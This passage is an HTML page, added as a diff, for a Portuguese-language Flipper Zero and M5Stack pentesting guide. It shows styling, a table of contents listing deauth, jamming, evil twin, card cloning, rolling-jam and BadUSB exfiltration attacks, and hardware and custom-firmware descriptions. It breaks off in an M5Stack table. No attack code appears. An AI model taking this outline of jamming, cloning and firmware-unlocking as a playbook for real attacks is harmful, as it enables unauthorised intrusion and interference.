@@ -1,0 +1,2843 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flipper Zero & M5Stack - CyberHack</title>
+    
+    <link rel="icon" href="r.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="r.png" type="image/x-icon" />
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', 'Courier New', monospace;
+            color: #fff;
+            user-select: none;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap');
+
+        body {
+            background-color: #000000;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .noise {
+            display: none;
+        }
+
+        #canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        header {
+            padding: 20px 0;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+
+        .logo::before {
+            content: '';
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #ff69b4;
+            margin-right: 10px;
+            box-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.7; }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            position: relative;
+            transition: color 0.3s;
+        }
+        
+        .home-btn {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(255, 20, 147, 0.4);
+            transition: all 0.3s ease !important;
+        }
+        
+        .home-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.6);
+            color: #fff !important;
+        }
+        
+        .download-btn {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(255, 20, 147, 0.4);
+            transition: all 0.3s ease !important;
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.6);
+            color: #fff !important;
+        }
+        
+        .download-btn::after {
+            display: none;
+        }
+
+        .nav-links a:hover {
+            color: #ff69b4;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff69b4, transparent);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .hero {
+            height: 400px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            margin-bottom: 50px;
+            perspective: 1000px;
+        }
+
+        .hero-content {
+            position: relative;
+            transform-style: preserve-3d;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px) rotateX(0deg); }
+            50% { transform: translateY(-20px) rotateX(5deg); }
+            100% { transform: translateY(0px) rotateX(0deg); }
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 700;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            position: relative;
+        }
+
+        .hero h1::before,
+        .hero h1::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .hero h1::before {
+            left: 2px;
+            text-shadow: -1px 0 #00ffea;
+            animation: glitch-before 3s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        .hero h1::after {
+            left: -2px;
+            text-shadow: 1px 0 #ff00c1;
+            animation: glitch-after 2s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        @keyframes glitch-before {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(30% 0 25% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        @keyframes glitch-after {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(10% 0 40% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 800px;
+            margin-bottom: 30px;
+        }
+
+        .hero-btn {
+            display: inline-block;
+            padding: 12px 25px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+        }
+
+        .hero-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 20, 147, 0.6);
+        }
+
+        .hero-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .hero-btn:hover::before {
+            left: 100%;
+        }
+
+        .content-section {
+            margin-bottom: 50px;
+            background: rgba(15, 15, 15, 0.8);
+            border-radius: 15px;
+            padding: 30px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+        }
+
+        .content-section h2 {
+            font-size: 32px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+        }
+
+        .content-section h2::after {
+            content: "";
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100px;
+            height: 2px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+
+        .content-section h3 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin: 25px 0 15px;
+            position: relative;
+        }
+
+        .content-section h4 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin: 20px 0 10px;
+            position: relative;
+        }
+
+        .content-section p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .content-section ul, .content-section ol {
+            padding-left: 25px;
+            margin-bottom: 20px;
+        }
+
+        .content-section li {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .toc {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            margin-bottom: 15px;
+        }
+
+        .toc ul {
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        .toc ul ul {
+            padding-left: 20px;
+        }
+
+        .toc li {
+            margin-bottom: 5px;
+        }
+
+        .toc a {
+            text-decoration: none;
+            color: rgba(255, 255, 255, 0.8);
+            transition: color 0.3s;
+        }
+
+        .toc a:hover {
+            color: #ff69b4;
+            text-decoration: underline;
+        }
+
+        .code-block {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 3px solid #ff69b4;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            margin: 0;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.2);
+        }
+
+        th {
+            background: rgba(255, 105, 180, 0.15);
+            color: #ff69b4;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+
+        td {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(255, 105, 180, 0.05);
+        }
+
+        .device-section {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .device-card {
+            flex: 1 1 400px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+        }
+
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(255, 20, 147, 0.3);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .device-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 15px;
+        }
+
+        .device-icon {
+            font-size: 32px;
+            color: #ff69b4;
+        }
+
+        .device-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #ff69b4;
+        }
+
+        .module-section {
+            margin-top: 30px;
+        }
+
+        .module-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+
+        .module-card {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .module-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 105, 180, 0.6);
+            box-shadow: 0 10px 25px rgba(255, 20, 147, 0.2);
+        }
+
+        .module-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #ff1493, #ff69b4);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.4s ease;
+        }
+
+        .module-card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .module-card h4 {
+            margin-top: 0;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .module-card i {
+            font-size: 20px;
+            color: #ff69b4;
+        }
+
+        .firmware-section {
+            margin-top: 40px;
+        }
+
+        .firmware-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .firmware-card {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .firmware-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 105, 180, 0.6);
+            box-shadow: 0 10px 25px rgba(255, 20, 147, 0.2);
+        }
+
+        .firmware-card h4 {
+            margin-top: 0;
+            margin-bottom: 15px;
+        }
+
+        .firmware-card p {
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .firmware-btn {
+            display: inline-block;
+            padding: 8px 15px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .firmware-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+        }
+
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: #ffc107;
+            margin-top: 0;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .warning-box h4 i {
+            color: #ffc107;
+        }
+
+        .warning-box p {
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 0;
+        }
+
+        .tip-box {
+            background: rgba(46, 213, 115, 0.1);
+            border-left: 4px solid #2ed573;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+
+        .tip-box h4 {
+            color: #2ed573;
+            margin-top: 0;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .tip-box h4 i {
+            color: #2ed573;
+        }
+
+        .tip-box p {
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 0;
+        }
+
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            text-decoration: none;
+            font-size: 24px;
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(255, 20, 147, 0.6);
+        }
+
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+            margin-top: 50px;
+        }
+
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #ff69b4;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-links a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            color: #ff69b4;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            background: rgba(255, 105, 180, 0.2);
+            transform: translateY(-3px);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+        
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 36px;
+            }
+            .device-section {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            .nav-links {
+                display: none;
+            }
+            .mobile-menu-btn {
+                display: block;
+            }
+            .hero h1 {
+                font-size: 28px;
+            }
+            .module-grid, .firmware-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: #ff69b4;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .digital-numbers {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #ff69b4;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        #random-numbers {
+            animation: flicker 0.5s infinite alternate;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="container">
+        <header>
+            <div class="logo">CyberHack</div>
+            <nav class="nav-links">
+                <a href="index.html" class="home-btn"><i class="fas fa-home"></i> Home</a>
+                <a href="#flipper">Flipper Zero</a>
+                <a href="#m5stack">M5Stack</a>
+                <a href="#wifi">WiFi Hacking</a>
+                <a href="#rfid">RFID/NFC</a>
+                <a href="#firmware">Firmwares</a>
+            </nav>
+            <button class="mobile-menu-btn">
+                <i class="fas fa-bars"></i>
+            </button>
+        </header>
+
+        <section class="hero">
+            <div class="hero-content">
+                <h1 data-text="Flipper Zero & M5Stack">Flipper Zero & M5Stack</h1>
+                <p>Domine os dispositivos mais poderosos para pentesting, hacking de hardware e segurança sem fio.</p>
+                <a href="#toc" class="hero-btn">EXPLORAR GUIA COMPLETO</a>
+            </div>
+        </section>
+
+        <section id="toc" class="content-section">
+            <h2>Índice do Conteúdo</h2>
+            <div class="toc">
+                <ul>
+                    <li><a href="#introdução">1. Introdução aos Dispositivos</a></li>
+                    <li>
+                        <a href="#flipper">2. Flipper Zero</a>
+                        <ul>
+                            <li><a href="#flipper-hardware">2.1. Especificações de Hardware</a></li>
+                            <li><a href="#flipper-interface">2.2. Interface e Navegação</a></li>
+                            <li><a href="#flipper-firmwares">2.3. Firmwares Personalizados</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#m5stack">3. M5Stack</a>
+                        <ul>
+                            <li><a href="#m5stack-hardware">3.1. Modelos e Especificações</a></li>
+                            <li><a href="#m5stack-uiflow">3.2. Programação com UIFlow</a></li>
+                            <li><a href="#m5stack-arduino">3.3. Programação com Arduino IDE</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#wifi">4. Hacking WiFi</a>
+                        <ul>
+                            <li><a href="#wifi-marauder">4.1. ESP32 Marauder no Flipper Zero</a></li>
+                            <li><a href="#wifi-deauth">4.2. Ataques de Deauth</a></li>
+                            <li><a href="#wifi-jamming">4.3. Jamming de 2.4GHz e 5GHz</a></li>
+                            <li><a href="#wifi-evil">4.4. Redes Evil Twin</a></li>
+                            <li><a href="#wifi-handshake">4.5. Captura de Handshakes</a></li>
+                            <li><a href="#wifi-bruteforce">4.6. Ataques de Força Bruta</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#bluetooth">5. Hacking Bluetooth</a>
+                        <ul>
+                            <li><a href="#bluetooth-scan">5.1. Escaneamento e Reconhecimento</a></li>
+                            <li><a href="#bluetooth-sniff">5.2. Sniffing de Pacotes</a></li>
+                            <li><a href="#bluetooth-spoofing">5.3. MAC Spoofing</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#rfid">6. RFID e NFC</a>
+                        <ul>
+                            <li><a href="#rfid-leitura">6.1. Leitura de Cartões</a></li>
+                            <li><a href="#rfid-emulação">6.2. Emulação de Cartões</a></li>
+                            <li><a href="#rfid-clonagem">6.3. Clonagem de Cartões</a></li>
+                            <li><a href="#rfid-bruteforce">6.4. Brute Force de Chaves</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#subghz">7. Sub-GHz (433/315MHz)</a>
+                        <ul>
+                            <li><a href="#subghz-captura">7.1. Captura de Sinais</a></li>
+                            <li><a href="#subghz-replay">7.2. Replay de Sinais</a></li>
+                            <li><a href="#subghz-bruteforce">7.3. Brute Force de Códigos</a></li>
+                            <li><a href="#subghz-rollingjam">7.4. Ataques de Rolling Jam</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#ir">8. Infrared (IR)</a>
+                        <ul>
+                            <li><a href="#ir-captura">8.1. Captura de Sinais IR</a></li>
+                            <li><a href="#ir-universais">8.2. Controles Universais</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#badusb">9. BadUSB</a>
+                        <ul>
+                            <li><a href="#badusb-scripts">9.1. Scripts de Payload</a></li>
+                            <li><a href="#badusb-ataques">9.2. Ataques de Exfiltração</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#projetos">10. Projetos Avançados</a>
+                        <ul>
+                            <li><a href="#projetos-wardriving">10.1. Wardriving Automatizado</a></li>
+                            <li><a href="#projetos-pwnagotchi">10.2. Integração com Pwnagotchi</a></li>
+                            <li><a href="#projetos-dronehacking">10.3. Drone Hacking</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#firmware">11. Firmwares e Downloads</a></li>
+                    <li><a href="#legal">12. Considerações Legais e Éticas</a></li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="introdução" class="content-section">
+            <h2>Introdução aos Dispositivos</h2>
+            <p>O Flipper Zero e o M5Stack se tornaram ferramentas essenciais para profissionais de segurança, pentesters e entusiastas de hardware hacking. Ambos os dispositivos oferecem capacidades poderosas em um formato portátil e acessível, permitindo testar e analisar diversos sistemas de segurança eletrônica.</p>
+            
+            <div class="device-section">
+                <div class="device-card">
+                    <div class="device-header">
+                        <i class="fas fa-microchip device-icon"></i>
+                        <h3 class="device-title">Flipper Zero</h3>
+                    </div>
+                    <p>O Flipper Zero é um "multi-ferramenta" portátil para pentest de hardware e sistemas de segurança sem fio. Pode interagir com sistemas RFID, NFC, infravermelhos, sub-GHz, Bluetooth e funciona como ponte para outros dispositivos como ESP32 para ataques Wi-Fi.</p>
+                    <ul>
+                        <li>Leitura e emulação de cartões RFID (125kHz) e NFC (13.56MHz)</li>
+                        <li>Captura e reprodução de sinais sub-GHz (controles remotos, portões)</li>
+                        <li>Funcionalidade de BadUSB para ataques de dispositivos HID</li>
+                        <li>Receptor e transmissor IR para controlar TVs e outros aparelhos</li>
+                        <li>GPIO para conexão com outros dispositivos (ESP32, Raspberry Pi)</li>
+                    </ul>
+                </div>
+                
+                <div class="device-card">
+                    <div class="device-header">
+                        <i class="fas fa-cube device-icon"></i>
+                        <h3 class="device-title">M5Stack</h3>
+                    </div>
+                    <p>O M5Stack é uma série de dispositivos modulares baseados em ESP32, com tela, botões e interfaces expansíveis. Sua arquitetura modular permite criar rapidamente ferramentas para diversos cenários de segurança e pentesting.</p>
+                    <ul>
+                        <li>Processador ESP32 dual-core com WiFi e Bluetooth integrados</li>
+                        <li>Tela colorida para interface gráfica de aplicações</li>
+                        <li>Sistema modular com diversos add-ons (GPS, LoRa, GSM, etc.)</li>
+                        <li>Capacidades de WiFi deauth, scanning e packet sniffing</li>
+                        <li>Programável via Arduino IDE, UIFlow (Blockly) ou MicroPython</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Aviso Legal</h4>
+                <p>As técnicas e ferramentas descritas neste guia são para fins educacionais e testes autorizados. O uso indevido destas técnicas para invadir redes ou dispositivos sem autorização é ilegal e pode resultar em sérias consequências legais. Sempre obtenha permissão explícita antes de realizar qualquer teste de segurança.</p>
+            </div>
+        </section>
+
+        <section id="flipper" class="content-section">
+            <h2>Flipper Zero</h2>
+            <p>O Flipper Zero tornou-se rapidamente um dos dispositivos mais populares para testes de segurança física e sem fio. Seu design amigável com uma interface inspirada em Tamagotchi esconde um conjunto poderoso de ferramentas para interação com diversos sistemas.</p>
+            
+            <h3 id="flipper-hardware">Especificações de Hardware</h3>
+            <div class="table-container">
+                <table>
+                    <tr>
+                        <th>Componente</th>
+                        <th>Especificação</th>
+                    </tr>
+                    <tr>
+                        <td>Processador</td>
+                        <td>STM32 ARM Cortex-M4 (80MHz)</td>
+                    </tr>
+                    <tr>
+                        <td>Memória</td>
+                        <td>1MB de Flash, 192KB de RAM</td>
+                    </tr>
+                    <tr>
+                        <td>Armazenamento</td>
+                        <td>Slot para cartão micro SD externo</td>
+                    </tr>
+                    <tr>
+                        <td>Tela</td>
+                        <td>LCD monocromático de 128x64 pixels</td>
+                    </tr>
+                    <tr>
+                        <td>Bateria</td>
+                        <td>Li-Po 2000mAh (recarregável via USB-C)</td>
+                    </tr>
+                    <tr>
+                        <td>Entradas/Saídas</td>
+                        <td>Porta USB Type-C, GPIO/SPI conector de 10 pinos</td>
+                    </tr>
+                    <tr>
+                        <td>Transceptores</td>
+                        <td>CC1101 (433/315MHz), NFC (13.56MHz), RFID (125kHz), IR</td>
+                    </tr>
+                    <tr>
+                        <td>Interface</td>
+                        <td>D-pad de 5 botões, botão traseiro</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <h3 id="flipper-interface">Interface e Navegação</h3>
+            <p>A interface do Flipper Zero é organizada em um menu principal com diferentes aplicativos para cada funcionalidade:</p>
+            
+            <div class="module-grid">
+                <div class="module-card">
+                    <h4><i class="fas fa-wifi"></i> Sub-GHz</h4>
+                    <p>Recebe e transmite sinais de rádio em 433/315MHz, usado para controles remotos, portões automáticos, e outros dispositivos sem fio.</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-id-card"></i> RFID</h4>
+                    <p>Lê, emula e escreve tags RFID de 125kHz (EM4100, HID ProxCard, Indala).</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-credit-card"></i> NFC</h4>
+                    <p>Trabalha com tecnologias de 13.56MHz, incluindo MIFARE Classic, MIFARE Ultralight, EMV, e outros padrões NFC.</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-tv"></i> Infrared</h4>
+                    <p>Captura, armazena e reproduz sinais infravermelhos para controlar TVs, ar-condicionados e outros aparelhos.</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-keyboard"></i> BadUSB</h4>
+                    <p>Funciona como um teclado USB malicioso, executando scripts para automatizar comandos.</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-gamepad"></i> iButton</h4>
+                    <p>Lê e emula chaves Dallas e Cyfral, comumente usadas em sistemas de controle de acesso.</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-plug"></i> GPIO</h4>
+                    <p>Permite controlar os pinos GPIO para comunicação com outros dispositivos e sensores.</p>
+                </div>
+                
+                <div class="module-card">
+                    <h4><i class="fas fa-tools"></i> Utilities</h4>
+                    <p>Inclui ferramentas como osciloscópio, analisador de protocolo, gravador de áudio e outros utilitários.</p>
+                </div>
+            </div>
+            
+            <p>Navegação básica no Flipper Zero:</p>
+            <ul>
+                <li>Botão central (OK): Seleciona opções ou confirma ações</li>
+                <li>D-pad: Navegação nos menus (cima, baixo, esquerda, direita)</li>
+                <li>Botão traseiro: Volta ao menu anterior ou cancela operações</li>
+                <li>Pressionar botão traseiro + direito simultaneamente: Captura de tela</li>
+                <li>Pressionar botão traseiro por 3 segundos: Desliga o dispositivo</li>
+            </ul>
+            
+            <h3 id="flipper-firmwares">Firmwares Personalizados</h3>
+            <p>O firmware oficial do Flipper Zero tem limitações por razões legais e regulatórias. Existem vários firmwares personalizados (CFWs) que desbloqueiam recursos avançados e aumentam as capacidades do dispositivo:</p>
+            
+            <div class="table-container">
+                <table>
+                    <tr>
+                        <th>Firmware</th>
+                        <th>Recursos Adicionais</th>
+                        <th>Melhor para</th>
+                    </tr>
+                    <tr>
+                        <td>Unleashed</td>
+                        <td>Frequências desbloqueadas, protocolo rolling code, transmissões de maior potência</td>
+                        <td>Uso geral avançado, maior compatibilidade</td>
+                    </tr>
+                    <tr>
+                        <td>RogueMaster</td>
+                        <td>Aplicativos extras, jogos, UI personalizada, recursos experimentais</td>
+                        <td>Experimentação, personalização</td>
+                    </tr>
+                    <tr>
+                        <td>Xtreme</td>
+                        <td>Combina recursos do Unleashed e RogueMaster, interface personalizada</td>
+                        <td>Todas as funcionalidades possíveis</td>
+                    </tr>
+                    <tr>
+                        <td>Dexv</td>
+                        <td>Focado em performance, otimizado para Sub-GHz</td>
+                        <td>Pentesting de Sub-GHz e RFID</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica Profissional</h4>
+                <p>Para maior flexibilidade, mantenha vários firmwares em seu cartão SD. O Flipper Zero permite alternar entre firmwares usando o aplicativo "Storage → Update" sem precisar conectar ao computador.</p>
+            </div>
+        </section>
+
+        <section id="m5stack" class="content-section">
+            <h2>M5Stack</h2>
+            <p>O M5Stack é uma plataforma de desenvolvimento baseada em ESP32 com design modular, permitindo adicionar ou remover componentes conforme necessário. Esta flexibilidade torna o M5Stack ideal para criar ferramentas de pentesting personalizadas.</p>
+            
+            <h3 id="m5stack-hardware">Modelos e Especificações</h3>
+            <p>Existem diversos modelos de M5Stack com diferentes capacidades:</p>
+            
+            <div class="table-container">
+                <table>
+                    <tr>
+                        <th>Modelo</th>
+                        <th>Especificações</th>
+                        <th>Melhor para</th>
+                    </tr>
+                    <tr>
+                        <td>M5Stack Basic</td>
+                        <td>ESP32, 4MB PSRAM, LCD 320x240, bateria 110mAh</td>
+                        <td>Iniciantes, projetos simples</td>
+                    </tr>
+                    <tr>
+                        <td>M5Stack Gray</td>
+                        <td>ESP32, 16MB Flash, 8MB PSRAM, LCD 320x240, bateria 150mAh, MPU9250</td>
+                        <td>Projetos intermediários</td>
+                    </tr>
+                    <tr>
+                        <td>M5Stack Core2</td>
